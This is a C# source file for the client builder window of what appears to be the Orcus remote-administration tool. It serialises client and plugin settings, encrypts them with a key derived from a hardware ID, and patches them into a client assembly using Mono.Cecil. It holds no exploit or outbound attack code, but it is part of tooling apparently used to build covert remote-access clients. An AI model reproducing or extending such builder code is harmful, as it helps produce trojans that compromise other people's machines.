using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Xml.Serialization;
using Mono.Cecil;
using Mono.Cecil.Cil;
using Orcus.Administration.Controls.Builder;
using Orcus.Administration.Core.Build;
using Orcus.Administration.Core.Plugins.Wrappers;
using Orcus.Administration.Licensing;
using Orcus.Administration.Plugins.BuildPlugin;
using Orcus.Administration.ViewModels;
using Orcus.Administration.ViewModels.ClientBuilder;
using Orcus.Plugins.Builder;
using Orcus.Plugins.PropertyGrid;
using Orcus.Shared.Client;
using Orcus.Shared.Core;
using Orcus.Shared.Encryption;

namespace Orcus.Administration.Views
{
    /// <summary>
    ///     Interaction logic for ClientBuilderWindow.xaml
    /// </summary>
    public partial class ClientBuilderWindow
    {
        static ClientBuilderWindow()
        {
            Builder.ApplySettings = ApplySettings;
        }

        public ClientBuilderWindow()
        {
            InitializeComponent();
            DataContextChanged += OnDataContextChanged;
        }

        private void OnDataContextChanged(object sender,
            DependencyPropertyChangedEventArgs dependencyPropertyChangedEventArgs)
        {
            var clientBuilderViewModel = (ClientBuilderViewModel) dependencyPropertyChangedEventArgs.NewValue;
            clientBuilderViewModel.ShowBuilderProperty += OnShowBuilderProperty;
            clientBuilderViewModel.ShowBuildTab += ClientBuilderViewModelOnShowBuildTab;
        }

        private void ClientBuilderViewModelOnShowBuildTab(object sender, EventArgs eventArgs)
        {
            MainTabControl.SelectedIndex = 6;
        }

        private void OnShowBuilderProperty(object sender, IBuilderProperty builderProperty)
        {
            var builderPropertyViews = BuilderPropertiesItemsControl.GetCachedBuilderPropertyViews(this);
            var builderPropertyView =
                builderPropertyViews.FirstOrDefault(x => x.BuilderProperty == builderProperty.GetType());

            if (builderPropertyView == null)
                return;

            switch (builderPropertyView.PropertyPosition.BuilderCategory)
            {
                case BuilderCategory.GeneralSettings:
                    MainTabControl.SelectedIndex = 0;
                    break;
                case BuilderCategory.Connection:
                    MainTabControl.SelectedIndex = 1;
                    break;
                case BuilderCategory.Protection:
                    MainTabControl.SelectedIndex = 2;
                    break;
                case BuilderCategory.Installation:
                    MainTabControl.SelectedIndex = 3;
                    break;
                case BuilderCategory.Assembly:
                    MainTabControl.SelectedIndex = 4;
                    break;
            }
        }

        private void BuildConfigurationButto_OnPreviewMouseLeftButtonUp(object sender, MouseButtonEventArgs e)
        {
            ConfigurationPopup.IsOpen = false;
            ((ClientBuilderViewModel) DataContext).LoadBuildConfigurationCommand.Execute(
                ((Button) sender).DataContext as BuildConfigurationViewModel);
            e.Handled = true;
        }

        private static void ApplySettings(AssemblyDefinition assemblyDefinition, List<IBuilderProperty> settings,
            List<PluginResourceInfo> pluginResources, List<ClientPlugin> plugins, IBuildLogger buildLogger)
        {
            string encryptionKey;

            using (var rsa = new RSACryptoServiceProvider(2048))
            {
                rsa.FromXmlString(
                    "<RSAKeyValue><Modulus>0KP1FXkZN1mfNPh2+rOUUh+4GdH5Z0HEE99acDdwkjW0twzNUOJelpKZCDlDgPpbtfsTNzeaSe1gpSH+etfQMenfvNJRIYiM0llWinGCArGF3PlfmcCIxnQp40iBKrxB4vJJlI0bCmw4zXr0ofNB2Yx9qNDpVII+NUkQ+MAqOh8=</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>");
                encryptionKey =
                    Convert.ToBase64String(
                        rsa.Encrypt(Encoding.UTF8.GetBytes(new string(HardwareIdGenerator.HardwareId.Reverse().ToArray())), true));
            }

            var clientSettings = settings.Select(builderProperty => builderProperty.ToClientSetting()).ToList();
            var pluginSettings = new List<PluginSetting>();

            var allTypes = new List<Type>(BuilderPropertyHelper.GetAllBuilderPropertyTypes());

            var provideBuilderSettingsType = new Lazy<string>(() => typeof (IProvideBuilderSettings).FullName);
            foreach (var clientPlugin in plugins)
            {
                var providesProperties = clientPlugin.Plugin as IProvideEditableProperties;
                if (providesProperties != null)
                {
                    pluginSettings.Add(new PluginSetting
                    {
                        PluginId = clientPlugin.PluginInfo.Guid,
                        Properties =
                            new List<PropertyNameValue>(
                                providesProperties.Properties.Select(x => x.ToPropertyNameValue())),
                        SettingsType = provideBuilderSettingsType.Value
                    });
                    allTypes.AddRange(providesProperties.Properties.Select(x => x.PropertyType));
                    continue;
                }

                var providesBuilderSettings = clientPlugin.Plugin as IProvideBuilderSettings;
                if (providesBuilderSettings != null)
                {
                    pluginSettings.AddRange(
                        providesBuilderSettings.BuilderSettings.Select(
                            builderSetting => builderSetting.BuilderProperty.ToPluginSetting(clientPlugin.PluginInfo)));
                    allTypes.AddRange(providesBuilderSettings.BuilderSettings.Select(x => x.BuilderProperty.GetType()));
                }
            }

            var clientConfig = new ClientConfig
            {
                PluginResources = pluginResources,
                Settings = clientSettings
            };

            buildLogger.Status(string.Format((string) Application.Current.Resources["BuildStatusClientConfigCreated"],
                clientConfig.Settings.Count, clientConfig.PluginResources.Count));

            buildLogger.Status(string.Format((string) Application.Current.Resources["BuildStatusPluginConfigCreated"],
                pluginSettings.Count));

            var xmlSerializer = new XmlSerializer(typeof (ClientConfig), allTypes.ToArray());

            string settingsString;
            using (var stringWriter = new StringWriter())
            {
                xmlSerializer.Serialize(stringWriter, clientConfig);
                settingsString = stringWriter.ToString();
            }

            buildLogger.Status(string.Format(
                (string) Application.Current.Resources["BuildStatusClientConfigSerialized"],
                settingsString.Length));

            xmlSerializer = new XmlSerializer(typeof (List<PluginSetting>), allTypes.ToArray());

            string pluginSettingsString;
            using (var stringWriter = new StringWriter())
            {
                xmlSerializer.Serialize(stringWriter, pluginSettings);
                pluginSettingsString = stringWriter.ToString();
            }

            buildLogger.Status(string.Format(
                (string) Application.Current.Resources["BuildStatusPluginConfigSerialized"],
                pluginSettingsString.Length));

            var success = false;
            foreach (var typeDef in assemblyDefinition.Modules[0].Types)
            {
                if (typeDef.FullName == "Orcus.Config.SettingsData")
                {
                    foreach (var methodDef in typeDef.Methods)
                    {
                        if (methodDef.Name == ".cctor")
                        {
                            var strings = 1;

                            foreach (Instruction instruction in methodDef.Body.Instructions)
                            {
                                if (instruction.OpCode.Name == "ldstr") // string
                                {
                                    switch (strings)
                                    {
                                        case 1:
                                            instruction.Operand = AES.Encrypt(settingsString,
                                                encryptionKey);
                                            buildLogger.Status(
                                                (string) Application.Current.Resources["BuildStatusWriteClientConfig"]);
                                            break;
                                        case 2:
                                            instruction.Operand = AES.Encrypt(pluginSettingsString,
                                                encryptionKey);
                                            buildLogger.Status(
                                                (string) Application.Current.Resources["BuildStatusWritePluginConfig"]);
                                            break;
                                        case 3:
                                            instruction.Operand = encryptionKey;
                                            buildLogger.Status(
                                                (string) Application.Current.Resources["BuildStatusWriteSignature"]);
                                            success = true;
                                            break;
                                    }
                                    strings++;
                                }
                            }
                        }
                    }
                }
            }

            if (!success)
                throw new Exception((string) Application.Current.Resources["BuildStatusUnableFindSettingsNamespace"]);

            buildLogger.Success(
                (string) Application.Current.Resources["BuildStatusConfigWrittenSuccessfully"]);
        }
    }
}